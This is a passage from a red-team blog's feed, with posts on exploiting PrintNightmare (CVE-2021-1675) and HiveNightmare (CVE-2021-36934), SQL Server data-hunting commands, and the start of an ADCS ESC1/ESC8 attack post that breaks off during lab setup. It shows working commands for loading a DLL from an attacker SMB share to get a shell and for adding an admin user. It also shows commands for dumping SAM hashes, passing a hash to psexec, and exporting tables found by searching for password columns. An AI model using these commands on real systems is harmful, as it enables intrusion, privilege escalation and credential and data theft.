configuration</h4><pre class="line-numbers language-none"><code class="language-none">DLL can be placed under anonymous access. The access effect is as follows <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/CVE-2021-1675%20Windows%20Privilege%20promotion/image-20210820171226175.png"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Config maybe you can like this:windows OR linux:└─<span class="token comment"># tail -20 /etc/samba/smb.conf</span><span class="token punctuation">[</span>global<span class="token punctuation">]</span>workgroup <span class="token operator">=</span> workgroupserver string <span class="token operator">=</span> <span class="token builtin class-name">test</span>netbios name <span class="token operator">=</span> MZsecurity <span class="token operator">=</span> usermap to guest <span class="token operator">=</span> Bad Usersmb ports <span class="token operator">=</span> <span class="token number">445</span>log <span class="token function">file</span> <span class="token operator">=</span> /var/log/samba/log.%mmax log size <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">[</span>smb<span class="token punctuation">]</span>comment <span class="token operator">=</span> Sambabrowseable <span class="token operator">=</span> <span class="token function">yes</span>writeable <span class="token operator">=</span> <span class="token function">yes</span>public <span class="token operator">=</span> <span class="token function">yes</span>path <span class="token operator">=</span> /tmp/<span class="token builtin class-name">read</span> only <span class="token operator">=</span> noguest ok <span class="token operator">=</span> <span class="token function">yes</span>OR <span class="token function">mkdir</span> C:<span class="token punctuation">\</span>shareicacls C:<span class="token punctuation">\</span>share<span class="token punctuation">\</span> /T /grant <span class="token string">"ANONYMOUS LOGON"</span>:ricacls C:<span class="token punctuation">\</span>share<span class="token punctuation">\</span> /T /grant Everyone:rNew-SmbShare -Path C:<span class="token punctuation">\</span>share -Name share -ReadAccess <span class="token string">'ANONYMOUS LOGON'</span>,<span class="token string">'Everyone'</span>REG ADD <span class="token string">"HKLM\System\CurrentControlSet\Services\LanManServer\Parameters"</span> /v NullSessionPipes /t REG_MULTI_SZ /d srvsvc /f <span class="token comment">#This will overwrite existing NullSessionPipes</span>REG ADD <span class="token string">"HKLM\System\CurrentControlSet\Services\LanManServer\Parameters"</span> /v NullSessionShares /t REG_MULTI_SZ /d share /fREG ADD <span class="token string">"HKLM\System\CurrentControlSet\Control\Lsa"</span> /v EveryoneIncludesAnonymous /t REG_DWORD /d <span class="token number">1</span> /fREG ADD <span class="token string">"HKLM\System\CurrentControlSet\Control\Lsa"</span> /v RestrictAnonymous /t REG_DWORD /d <span class="token number">0</span> /f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre class="line-numbers language-none"><code class="language-none">In my some test there are a lot of different kinds of exp on the Internet, but the GitHub script here is actually the most stable Python script. There is also a script to change the parameters. There are more personal problems. The most prominent thing is that the 122 line needs to be changed to the target specific ID.info.pDriverPath &#x3D; (LPWSTR)L&quot;C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_7b3eed059f4c3e41\\Amd64\\UNIDRV.DLL&quot;But I&#39;m an attacker. How can I know the ntprint.inf_amd64_7b3eed059f4c3e41 special ID?In addition, there are three olds that need to be modified as follows:C:\\Windows\\System32\\spool\\drivers\\x64\\%sBut the in the attacking dir is:C:\\Windows\\System32\\spool\\drivers\\x64\\3In fact, it&#39;s still not good to change to this directory after testing... There&#39;s still a problem<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/CVE-2021-1675%20Windows%20Privilege%20promotion/image-20210820220359667.png"></p><pre class="line-numbers language-none"><code class="language-none">python3 CVE-2021-1675.py yangsir.git&#x2F;testy:Aa123456@192.168.159.100 &#39;\\192.168.159.13\smb\yangsir.dll&#39;Maybe you script will be wrong, but you also can be RCE to getshell~<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/CVE-2021-1675%20Windows%20Privilege%20promotion/image-20210820171648755.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/CVE-2021-1675%20Windows%20Privilege%20promotion/image-20210820171732259.png"></p><pre class="line-numbers language-none"><code class="language-none">You can confirm the dll file dir like this<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/CVE-2021-1675%20Windows%20Privilege%20promotion/image-20210820174232230.png"></p><h3 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h3><pre class="line-numbers language-none"><code class="language-none">Easy to attack also<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/CVE-2021-1675%20Windows%20Privilege%20promotion/image-20210820210531428.png"></p><h2 id="LPE"><a href="#LPE" class="headerlink" title="LPE"></a>LPE</h2><pre class="line-numbers language-none"><code class="language-none">Easy to attack tooImport-Module .\CVE-2021-1675.ps1Invoke-Nightmare -NewUser &quot;yyy&quot; -NewPassword &quot;Aa123456&quot;  -DriverName &quot;PrintMe&quot;  #This is you add the admin user must be to remember~<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/CVE-2021-1675%20Windows%20Privilege%20promotion/image-20210820213544413.png"></p><h2 id="Attention"><a href="#Attention" class="headerlink" title="Attention"></a>Attention</h2><pre class="line-numbers language-none"><code class="language-none">About failure of attack again after success:When trying rce, the printing service will stop after typing once, that is, it can only succeed once, and the service needs to be restarted <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/CVE-2021-1675%20Windows%20Privilege%20promotion/image-20210820204601191.png"></p><pre class="line-numbers language-none"><code class="language-none">About Server 2012 to attack failure:Except for users in the Domain Admins and enterprise admins, users of high permission groups calling rpcadprinterdriverex will be access_ denied<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Windows Privilege Promotion </tag>
            
            <tag> LPE </tag>
            
            <tag> CVE-2021-1675 </tag>
            
            <tag> Mimikatz </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-36934 Windows Privilege Promotion</title>
      <link href="2021/08/17/cve-2021-36934-windows-privilege-promotion/"/>
      <url>2021/08/17/cve-2021-36934-windows-privilege-promotion/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><pre class="line-numbers language-none"><code class="language-none">A privilege promotion vulnerability exists because access control lists (ACLs) are too loose on multiple system files, including the Security Account Manager (SAM) database. An attacker who successfully exploits this vulnerability can run arbitrary code with SYSTEM privileges. The attacker can then install the program; View, change, or delete data; Or create a new account with full user rights<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Vulnerability-detection"><a href="#Vulnerability-detection" class="headerlink" title="Vulnerability detection"></a>Vulnerability detection</h2><pre class="line-numbers language-none"><code class="language-none">icacls c:\windows\system32\config\samConfirming permissions is risky<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/CVE-2021-36934%20Windows%20Privilege%20promotion/image-20210817224055847.png"></p><h2 id="How-to-use"><a href="#How-to-use" class="headerlink" title="How to use"></a>How to use</h2><h3 id="Get-hash"><a href="#Get-hash" class="headerlink" title="Get hash"></a>Get hash</h3><h4 id="EXP1"><a href="#EXP1" class="headerlink" title="EXP1"></a>EXP1</h4><pre class="line-numbers language-none"><code class="language-none">Compile relevant files  https:&#x2F;&#x2F;github.com&#x2F;GossiTheDog&#x2F;HiveNightmareExecute hivenightcare.exe under the normal account, and the Sam, system and security files will be output in the current directory<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/CVE-2021-36934%20Windows%20Privilege%20promotion/image-20210817224634530.png"></p><pre class="line-numbers language-none"><code class="language-none">Using the secretsdump.py，like this you will be get tar hashpython3 secretsdump.py -system SYSTEM-2021-08-03 -security SECURITY-2021-08-03 -sam SAM-2021-08-03 local<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/CVE-2021-36934%20Windows%20Privilege%20promotion/image-20210817225128526.png"></p><h4 id="EXP2"><a href="#EXP2" class="headerlink" title="EXP2"></a>EXP2</h4><pre class="line-numbers language-none"><code class="language-none">Compile relevant files  https:&#x2F;&#x2F;github.com&#x2F;cube0x0&#x2F;CVE-2021-36934One step in place，get hash like this<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/CVE-2021-36934%20Windows%20Privilege%20promotion/image-20210817230352171.png"></p><h4 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h4><pre class="line-numbers language-none"><code class="language-none">Users with normal permissions get shadowcopy volume <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/CVE-2021-36934%20Windows%20Privilege%20promotion/image-20210817230352171.png"></p><pre class="line-numbers language-none"><code class="language-none">Easy to get hashlsadump::sam &#x2F;system:   &#x2F;sam:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/CVE-2021-36934%20Windows%20Privilege%20promotion/image-20210817230516328.png"></p><h3 id="Get-system"><a href="#Get-system" class="headerlink" title="Get system"></a>Get system</h3><pre class="line-numbers language-none"><code class="language-none">Easy to get like thispython psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:2d7f1a5a61d3a96fb5159b5eef17adc6 administrator@192.168.3.8 cmd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Windows Privilege Promotion </tag>
            
            <tag> LPE </tag>
            
            <tag> Mimikatz </tag>
            
            <tag> CVE-2021-36934 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sqlserver focus command</title>
      <link href="2021/08/16/sqlserver-focus-command/"/>
      <url>2021/08/16/sqlserver-focus-command/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-none"><code class="language-none">Record a tips, maybe somebody&amp;RT can useThe other day ON the T00ls forum, I saw a tool released by a black production team and documented some tips that the Red team could use<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="View-the-host-name-and-user-connected-to-the-database"><a href="#View-the-host-name-and-user-connected-to-the-database" class="headerlink" title="View the host name and user connected to the database"></a>View the host name and user connected to the database</h2><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> loginame<span class="token punctuation">,</span> hostname <span class="token keyword">from</span> sys<span class="token punctuation">.</span>sysprocesses<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Sqlserver%20focus%20command/image-20210812230659893.png"></p><h2 id="Obtaining-Database-Information"><a href="#Obtaining-Database-Information" class="headerlink" title="Obtaining Database Information"></a>Obtaining Database Information</h2><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> name <span class="token keyword">FROM</span> master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>sysdatabases<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Sqlserver%20focus%20command/image-20210812230748957.png"></p><h3 id="Obtain-the-database-size-information"><a href="#Obtain-the-database-size-information" class="headerlink" title="Obtain the database size information"></a>Obtain the database size information</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> d<span class="token punctuation">.</span>name<span class="token punctuation">,</span> <span class="token function">ROUND</span><span class="token punctuation">(</span><span class="token function">SUM</span><span class="token punctuation">(</span>mf<span class="token punctuation">.</span>size<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">/</span> <span class="token number">1024</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> sys<span class="token punctuation">.</span>master_files mf <span class="token keyword">INNER</span> <span class="token keyword">JOIN</span> sys<span class="token punctuation">.</span><span class="token keyword">databases</span> d <span class="token keyword">ON</span> d<span class="token punctuation">.</span>database_id <span class="token operator">=</span> mf<span class="token punctuation">.</span>database_id <span class="token keyword">WHERE</span> d<span class="token punctuation">.</span>database_id <span class="token operator">></span> <span class="token number">4</span> <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> d<span class="token punctuation">.</span>name <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> d<span class="token punctuation">.</span>name<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Sqlserver%20focus%20command/image-20210812230930949.png"></p><h2 id="Specifies-all-tables-in-the-database"><a href="#Specifies-all-tables-in-the-database" class="headerlink" title="Specifies all tables in the database"></a>Specifies all tables in the database</h2><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">use</span> LazyOA<span class="token punctuation">;</span> <span class="token keyword">exec</span> sp_tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Sqlserver%20focus%20command/image-20210812233307074.png"></p><h2 id="Specifies-the-number-of-database-rows"><a href="#Specifies-the-number-of-database-rows" class="headerlink" title="Specifies the number of database rows"></a>Specifies the number of database rows</h2><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">USE</span> LazyOA <span class="token keyword">SELECT</span> <span class="token keyword">TOP</span> <span class="token number">100</span> s<span class="token punctuation">.</span>Name <span class="token keyword">AS</span> SchemaName<span class="token punctuation">,</span> t<span class="token punctuation">.</span>Name <span class="token keyword">AS</span> TableName<span class="token punctuation">,</span> p<span class="token punctuation">.</span><span class="token keyword">rows</span> <span class="token keyword">AS</span> RowCounts<span class="token punctuation">,</span> CAST<span class="token punctuation">(</span><span class="token function">ROUND</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">SUM</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>total_pages<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">128.00</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token keyword">AS</span> <span class="token keyword">NUMERIC</span><span class="token punctuation">(</span><span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">AS</span> Total_MB <span class="token keyword">FROM</span> sys<span class="token punctuation">.</span><span class="token keyword">tables</span> t <span class="token keyword">INNER</span> <span class="token keyword">JOIN</span> sys<span class="token punctuation">.</span>indexes i <span class="token keyword">ON</span> t<span class="token punctuation">.</span>OBJECT_ID <span class="token operator">=</span> i<span class="token punctuation">.</span>object_id <span class="token keyword">INNER</span> <span class="token keyword">JOIN</span> sys<span class="token punctuation">.</span>partitions p <span class="token keyword">ON</span> i<span class="token punctuation">.</span>object_id <span class="token operator">=</span> p<span class="token punctuation">.</span>OBJECT_ID <span class="token operator">AND</span> i<span class="token punctuation">.</span>index_id <span class="token operator">=</span> p<span class="token punctuation">.</span>index_id <span class="token keyword">INNER</span> <span class="token keyword">JOIN</span> sys<span class="token punctuation">.</span>allocation_units a <span class="token keyword">ON</span> p<span class="token punctuation">.</span>partition_id <span class="token operator">=</span> a<span class="token punctuation">.</span>container_id <span class="token keyword">INNER</span> <span class="token keyword">JOIN</span> sys<span class="token punctuation">.</span>schemas s <span class="token keyword">ON</span> t<span class="token punctuation">.</span>schema_id <span class="token operator">=</span> s<span class="token punctuation">.</span>schema_id <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> t<span class="token punctuation">.</span>Name<span class="token punctuation">,</span> s<span class="token punctuation">.</span>Name<span class="token punctuation">,</span> p<span class="token punctuation">.</span><span class="token keyword">Rows</span> <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> RowCounts <span class="token keyword">desc</span><span class="token punctuation">,</span> Total_MB  <span class="token keyword">desc</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Sqlserver%20focus%20command/image-20210812231339381.png"></p><h2 id="Specifies-the-rows-in-the-data-table"><a href="#Specifies-the-rows-in-the-data-table" class="headerlink" title="Specifies the rows in the data table"></a>Specifies the rows in the data table</h2><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> LazyOA<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>Sys_Role<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Sqlserver%20focus%20command/image-20210812231646980.png"></p><h2 id="Specifies-the-first-10-entries-in-the-data-table"><a href="#Specifies-the-first-10-entries-in-the-data-table" class="headerlink" title="Specifies the first 10 entries in the data table"></a>Specifies the first 10 entries in the data table</h2><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token keyword">top</span> <span class="token number">10</span> <span class="token operator">*</span> <span class="token keyword">from</span> LazyOA<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>Sys_Role<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Sqlserver%20focus%20command/image-20210812231817603.png"></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">use</span> LazyOA<span class="token punctuation">;</span> <span class="token keyword">select</span> <span class="token keyword">top</span> <span class="token number">10</span> <span class="token operator">*</span> <span class="token keyword">from</span> Sys_Role<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Sqlserver%20focus%20command/image-20210812231921294.png"></p><h2 id="Specify-database-column-name-search"><a href="#Specify-database-column-name-search" class="headerlink" title="Specify database column name search"></a>Specify database column name search</h2><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> COLUMN_NAME <span class="token keyword">as</span> <span class="token string">'ColumnName'</span><span class="token punctuation">,</span> TABLE_NAME <span class="token keyword">as</span>  <span class="token string">'TableName'</span> <span class="token keyword">from</span> LazyOA<span class="token punctuation">.</span>INFORMATION_SCHEMA<span class="token punctuation">.</span><span class="token keyword">COLUMNS</span> <span class="token keyword">where</span> COLUMN_NAME <span class="token operator">like</span> <span class="token string">'%pass%'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Sqlserver%20focus%20command/image-20210812232042788.png"></p><h2 id="Specifying-data-Export"><a href="#Specifying-data-Export" class="headerlink" title="Specifying data Export"></a>Specifying data Export</h2><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">local</span> loginsqlcmd<span class="token punctuation">.</span>exe <span class="token operator">-</span>S localhost <span class="token operator">-</span>E <span class="token operator">-</span>Q <span class="token string">"select * from %databasename%.dbo.%tablename%"</span> <span class="token operator">-</span>W <span class="token operator">-</span>s<span class="token string">"|"</span> <span class="token operator">-</span>o <span class="token string">"C:\Windows\Temp\1.txt"</span>special loginsqlcmd<span class="token punctuation">.</span>exe <span class="token operator">-</span>S localhost <span class="token operator">-</span>U sa <span class="token operator">-</span>P admin  <span class="token operator">-</span>Q <span class="token string">"select * from LazyOA.dbo.Sys_User"</span> <span class="token operator">-</span>W <span class="token operator">-</span>s<span class="token string">"|"</span> <span class="token operator">-</span>o <span class="token string">"C:\Users\dbadmin\Desktop\1\1.txt"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Sqlserver%20focus%20command/image-20210812233018443.png"></p>]]></content>
      
      
      <categories>
          
          <category> Tips </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Command execution </tag>
            
            <tag> Information collection </tag>
            
            <tag> Sqlserver </tag>
            
            <tag> Database </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ADCS&amp;ESC1&amp;ESC8攻击方式</title>
      <link href="2021/08/16/adcs-esc1-esc8-gong-ji-fang-shi/"/>
      <url>2021/08/16/adcs-esc1-esc8-gong-ji-fang-shi/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-none"><code class="language-none">内容太多了，实在不想翻出来英文版本了，这回就中文冲了，凑合看即可<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><pre class="line-numbers language-none"><code class="language-none">利用方式Certified Pre-Owned: Abusing Active Directory Certificate Services出自于black hat2021https:&#x2F;&#x2F;www.blackhat.com&#x2F;us-21&#x2F;briefings&#x2F;schedule&#x2F;#certified-pre-owned-abusing-active-directory-certificate-services-23168https:&#x2F;&#x2F;www.specterops.io&#x2F;assets&#x2F;resources&#x2F;Certified_Pre-Owned.pdf强烈建议看下文前先过下上面两个英文素材，可以避免很多坑点<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h2><h3 id="PKI（Public-Key-Infrastructure公钥基础设施）"><a href="#PKI（Public-Key-Infrastructure公钥基础设施）" class="headerlink" title="PKI（Public Key Infrastructure公钥基础设施）"></a>PKI（Public Key Infrastructure公钥基础设施）</h3><pre class="line-numbers language-none"><code class="language-none">软件、加密技术、流程和服务的组合，使得组织能够保护其数据、通信、业务交易，PKI依赖于经过身份验证的用户和受信任资源之间的数字证书交换，可以用证书来保护数据并管理来自组织内外的用户和计算机身份凭证<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="ADCS"><a href="#ADCS" class="headerlink" title="ADCS"></a>ADCS</h3><pre class="line-numbers language-none"><code class="language-none">一个服务器角色，提供PKI功能，支持windows域上身份和其他安全功能如文件加密、邮件加密等，可以为组织内部使用创建、验证、撤销公钥证书通俗来说ADCS角色是实施PKI解决方案，ADCS允许构建公钥基础设置并为组织提供公钥加密、数字证书、数字签名的功能ADCS提供所有与PKI相关的组件作为角色服务，每个角色负责证书基础架构的特定部分，同时协同完成完整解决方案<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="认证机构"><a href="#认证机构" class="headerlink" title="认证机构"></a>认证机构</h4><pre class="line-numbers language-none"><code class="language-none">CA的主要目的是办法证书、撤销证书及发布授权信息方式和撤销信息，部署的第一个CA将成为PKI的根，随后可以部署位于PKI层次结构中的从属CA，根CA位于顶部，从属CA隐式信任根CA，并信任他颁布的cert<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="证书颁发机构web注册"><a href="#证书颁发机构web注册" class="headerlink" title="证书颁发机构web注册"></a>证书颁发机构web注册</h4><pre class="line-numbers language-none"><code class="language-none">使得用户使用未加入域或运行windows以外的设备下进行证书颁发续订的操作<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Onlie-responder"><a href="#Onlie-responder" class="headerlink" title="Onlie responder"></a>Onlie responder</h4><pre class="line-numbers language-none"><code class="language-none">配置管理在线证书状态协议OCSP验证和吊销检查，在线响应程序解码特定证书的吊销状态请求，评估这些证书的状态，并返回具有请求的证书状态信息的签名响应<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="网络设备注册服务（NDES）"><a href="#网络设备注册服务（NDES）" class="headerlink" title="网络设备注册服务（NDES）"></a>网络设备注册服务（NDES）</h4><pre class="line-numbers language-none"><code class="language-none">通过该组件，路由器交换器或其他设备可以从adcs获取证书<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="证书注册web服务（CES）"><a href="#证书注册web服务（CES）" class="headerlink" title="证书注册web服务（CES）"></a>证书注册web服务（CES）</h4><pre class="line-numbers language-none"><code class="language-none">用于运行windows的计算机和ca之间的代理客户端，ces使用户、计算机或者应用程序能够通过使用户web服务连接到ca<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="证书注册策略web服务"><a href="#证书注册策略web服务" class="headerlink" title="证书注册策略web服务"></a>证书注册策略web服务</h4><pre class="line-numbers language-none"><code class="language-none">使得用户能够获取证书注册策略信息，结合CES，可以在用户设备未加入域或无法连接域控的情况下基于策略的证书注册<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="图片介绍"><a href="#图片介绍" class="headerlink" title="图片介绍"></a>图片介绍</h4><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210815172411337.png"></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h3><pre class="line-numbers language-none"><code class="language-none">功能安装处如下选择：证书颁发机构证书颁发机构web注册证书注册web服务<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210813103047564.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210813103130284.png"></p><h3 id="配置服务"><a href="#配置服务" class="headerlink" title="配置服务"></a>配置服务</h3><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210813103341653.png"><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210815172508459.png"></p><pre class="line-numbers language-none"><code class="language-none">如下选择进行服务的细节配置<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210813103412505.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210813103433153.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210813103458913.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210813103527977.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210813103548543.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210813103609920.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210813103620572.png"><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210813103638717.png"><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210813103651916.png"></p><h3 id="配置证书注册web服务"><a href="#配置证书注册web服务" class="headerlink" title="配置证书注册web服务"></a>配置证书注册web服务</h3><pre class="line-numbers language-none"><code class="language-none">上一步完成会告诉你是否要配置其他角色服务<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210813103751908.png"></p><pre class="line-numbers language-none"><code class="language-none">依次如下配置即可<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210813103905088.png"><br><img 